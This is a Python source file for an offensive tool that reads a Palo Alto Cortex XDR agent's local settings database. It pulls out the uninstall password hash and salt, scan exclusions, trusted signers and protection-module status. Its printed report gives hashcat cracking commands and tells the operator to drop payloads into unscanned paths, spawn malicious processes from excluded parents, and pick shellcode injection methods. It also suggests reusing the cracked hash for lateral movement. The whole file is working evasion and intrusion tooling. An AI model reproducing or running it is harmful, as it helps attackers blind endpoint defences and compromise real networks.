"""
Cortex XDR config extractor.

Parses LevelDB .ldb files from Cybereason/Palo Alto Cortex XDR's agent
settings database (usually at):
  C:\\ProgramData\\Cyvera\\LocalSystem\\Persistence\\agent_settings.db\\

Extracts:
  - Uninstall password hash + salt  → feed to hashcat (mode 10900 / SHA-512)
  - DLL / PE path exclusions        → drop payload there, no scan
  - Child-process chain exclusions  → spawn from excluded parent
  - Memory protection status        → module enabled / disabled
  - Ransomware protection mode
  - Excluded signer CNs

Then cross-references against Lilith capabilities and prints tactical notes.
"""

from __future__ import annotations

import os
import re
import struct
import sys
from typing import Generator


# ── LevelDB .ldb / .log raw key-value scanner ──────────────────────────────

def _ldb_records(path: str) -> Generator[tuple[bytes, bytes], None, None]:
    """
    Yield (key, value) byte pairs from a LevelDB SSTable (.ldb) file.
    Only handles the data blocks; index / meta blocks are skipped.

    Format:
      File = [data block]* + [meta index block] + [index block] + footer(48)
      Block = [entry]* + trailer(5)
      Entry = shared_key_len(varint) + unshared_key_len(varint) + value_len(varint)
              + unshared_key_bytes + value_bytes
    """
    try:
        data = open(path, "rb").read()
    except OSError:
        return

    if len(data) < 48:
        return

    # footer: last 48 bytes — 8-byte magic at end
    MAGIC = b'\x57\xfb\x80\x8b\x24\x75\x47\xdb'
    if data[-8:] != MAGIC:
        return

    # metaindex_bh offset+size, index_bh offset+size stored as varints in footer
    footer_off = len(data) - 48
    # We only need the index block handle to find where data ends
    # Simpler: scan every 4096-byte-aligned block from offset 0
    pos = 0
    while pos + 5 < footer_off:
        # Try to read a block: entries until restart-array + trailer
        block_start = pos
        last_key = b""
        # blocks in LevelDB are typically 4 KiB but can vary;
        # scan entry by entry and rely on type bytes to detect end
        try:
            while pos < footer_off:
                shared, pos    = _varint(data, pos)
                unshared, pos  = _varint(data, pos)
                vlen, pos      = _varint(data, pos)
                if shared + unshared == 0 and vlen == 0:
                    break
                key_part = data[pos:pos + unshared]; pos += unshared
                val      = data[pos:pos + vlen];     pos += vlen
                key = last_key[:shared] + key_part
                last_key = key
                if key and val is not None:
                    yield key, val
        except (IndexError, struct.error):
            pos = block_start + 1  # corrupt entry; advance byte-by-byte


def _varint(buf: bytes, pos: int) -> tuple[int, int]:
    result = 0
    shift  = 0
    while True:
        b = buf[pos]; pos += 1
        result |= (b & 0x7F) << shift
        if not (b & 0x80):
            break
        shift += 7
    return result, pos


# ── SQLite fallback (newer agent versions use SQLite) ────────────────────────

def _try_sqlite(path: str) -> dict:
    """Return raw config dict if the .db dir contains a SQLite file."""
    for fname in os.listdir(path):
        fpath = os.path.join(path, fname)
        if os.path.isfile(fpath) and open(fpath, "rb").read(6) == b"SQLite":
            try:
                import sqlite3
                conn = sqlite3.connect(fpath)
                rows = conn.execute("SELECT key, value FROM config").fetchall()
                conn.close()
                return {k: v for k, v in rows}
            except Exception:
                pass
    return {}


# ── Config key patterns ───────────────────────────────────────────────────────

_RE_HASH   = re.compile(rb'uninstall.{0,32}?([0-9a-fA-F]{64,128})', re.DOTALL)
_RE_SALT   = re.compile(rb'salt[=:\s]{0,4}([0-9a-fA-F]{16,64})',    re.DOTALL)
_RE_EXCL   = re.compile(rb'[Ee]xclus(?:ion)?[Pp]ath[s]?\x00*((?:[A-Za-z]:\\[^\x00]+?\x00)+)')
_RE_SIGNER = re.compile(rb'[Ss]igner[Cc][Nn]\x00*([A-Za-z0-9 ,.\-]+)')
_RE_CHILD  = re.compile(rb'[Cc]hild[Pp]rocess[Ee]xclusion\x00*([^\x00]+\.exe[^\x00]*)', re.IGNORECASE)


def _parse_ldb_dir(db_dir: str) -> dict:
    config: dict = {"raw_values": {}, "exclusions": [], "child_exclusions": [],
                    "signer_cns": [], "hash": None, "salt": None,
                    "mem_protect": None, "ransomware": None}

    all_bytes = b""
    for fname in sorted(os.listdir(db_dir)):
        if fname.endswith((".ldb", ".log")):
            fpath = os.path.join(db_dir, fname)
            try:
                blob = open(fpath, "rb").read()
                all_bytes += blob
                for k, v in _ldb_records(fpath):
                    key_s = k.decode("utf-8", errors="replace")
                    val_s = v.decode("utf-8", errors="replace") if v else ""
                    config["raw_values"][key_s] = val_s

                    kl = key_s.lower()
                    if "exclusion" in kl and "path" in kl:
                        for p in re.findall(r'[A-Za-z]:\\[^\x00\n"]+', val_s):
                            config["exclusions"].append(p.strip())
                    if "child" in kl and "exclusion" in kl:
                        for p in re.findall(r'\w+\.exe\b[^\n"]*', val_s, re.IGNORECASE):
                            config["child_exclusions"].append(p.strip())
                    if "memory" in kl and ("protect" in kl or "module" in kl):
                        config["mem_protect"] = val_s.strip()
                    if "ransomware" in kl:
                        config["ransomware"] = val_s.strip()
                    if "signer" in kl:
                        for cn in re.findall(r'CN=([^,\n"]+)', val_s):
                            config["signer_cns"].append(cn.strip())
                    if "uninstall" in kl and ("hash" in kl or "password" in kl):
                        m = re.search(r'([0-9a-fA-F]{64,128})', val_s)
                        if m:
                            config["hash"] = m.group(1)
                    if "salt" in kl:
                        m = re.search(r'([0-9a-fA-F]{16,64})', val_s)
                        if m:
                            config["salt"] = m.group(1)
            except Exception as e:
                print(f"[!] Error reading {fname}: {e}")

    # fallback regex sweep over raw bytes
    if not config["hash"]:
        m = _RE_HASH.search(all_bytes)
        if m:
            config["hash"] = m.group(1).decode("ascii", errors="replace")
    if not config["salt"]:
        m = _RE_SALT.search(all_bytes)
        if m:
            config["salt"] = m.group(1).decode("ascii", errors="replace")

    return config


# ── Main entry point ──────────────────────────────────────────────────────────

def parse_and_report(db_path: str) -> None:
    """Parse a Cortex XDR agent_settings.db directory and print tactical report."""

    if not os.path.isdir(db_path):
        print(f"[!] Not a directory: {db_path}")
        sys.exit(1)

    print(f"\n[*] Parsing Cortex XDR config: {db_path}\n")
    config = _parse_ldb_dir(db_path)

    # ── Uninstall hash ────────────────────────────────────────────────────────
    print("=" * 60)
    print("UNINSTALL CREDENTIAL")
    print("=" * 60)
    if config["hash"]:
        print(f"  Hash : {config['hash']}")
        if config["salt"]:
            print(f"  Salt : {config['salt']}")
            print(f"\n  Hashcat (PBKDF2-SHA512, mode 10900):")
            print(f"    hashcat -m 10900 '{config['hash']}:{config['salt']}' rockyou.txt")
        else:
            print(f"\n  Hashcat (SHA-512, mode 1700):")
            print(f"    hashcat -m 1700 '{config['hash']}' rockyou.txt")
    else:
        print("  [not found in parsed records]")

    # ── Exclusions ────────────────────────────────────────────────────────────
    excl = sorted(set(config["exclusions"]))
    print(f"\n{'=' * 60}")
    print(f"PATH EXCLUSIONS ({len(excl)} found)")
    print("=" * 60)
    if excl:
        for p in excl:
            print(f"  {p}")
        print(f"\n  [*] Drop payload into any of the above — Cortex XDR will not scan it.")
    else:
        print("  [none found]")

    # ── Child-process exclusions ──────────────────────────────────────────────
    child = sorted(set(config["child_exclusions"]))
    print(f"\n{'=' * 60}")
    print(f"CHILD-PROCESS EXCLUSIONS ({len(child)} found)")
    print("=" * 60)
    if child:
        for p in child:
            print(f"  {p}")
        print(f"\n  [*] Spawn malicious child from any of the above to bypass child-process rules.")
    else:
        print("  [none found]")

    # ── Signer CNs ────────────────────────────────────────────────────────────
    signers = sorted(set(config["signer_cns"]))
    print(f"\n{'=' * 60}")
    print(f"TRUSTED SIGNER CNs ({len(signers)} found)")
    print("=" * 60)
    if signers:
        for cn in signers:
            print(f"  CN={cn}")
        print(f"\n  [*] Code signed with any of the above CNs bypasses Cortex XDR signature checks.")
    else:
        print("  [none found]")

    # ── Module status ─────────────────────────────────────────────────────────
    print(f"\n{'=' * 60}")
    print("MODULE STATUS")
    print("=" * 60)
    mp = config["mem_protect"] or "unknown"
    rw = config["ransomware"]   or "unknown"
    print(f"  Memory protection : {mp}")
    print(f"  Ransomware module : {rw}")

    # ── Tactical cross-reference ──────────────────────────────────────────────
    print(f"\n{'=' * 60}")
    print("LILITH TACTICAL NOTES")
    print("=" * 60)
    notes = []

    if excl:
        best = excl[0]
        notes.append(f"Drop runner_c.dat + stage.ps1 into '{best}' — exclusion bypasses on-write scan.")
        notes.append(f"Set url_prefix to serve files from the same path if serving over WebDAV.")

    if child:
        parent = child[0].split()[0]
        notes.append(f"Inject into '{parent}' first — child-process exclusion lets it spawn cmd.exe / powershell.exe undetected.")

    if "disabled" in mp.lower() or "off" in mp.lower():
        notes.append("Memory protection is OFF — shellcode injection (wnfinject/fiberexec) will not be caught by Cortex memory scan.")
    else:
        notes.append("Memory protection appears active — prefer fiber exec (fiberexec) over classic VirtualAlloc+CreateRemoteThread.")

    if config["hash"]:
        notes.append("Crack the uninstall hash with hashcat before engagement end — useful for lateral movement to other hosts with same XDR policy.")

    if not notes:
        notes.append("No actionable data extracted — try running with elevated privileges on a live agent host.")

    for i, note in enumerate(notes, 1):
        print(f"  {i}. {note}")

    print()
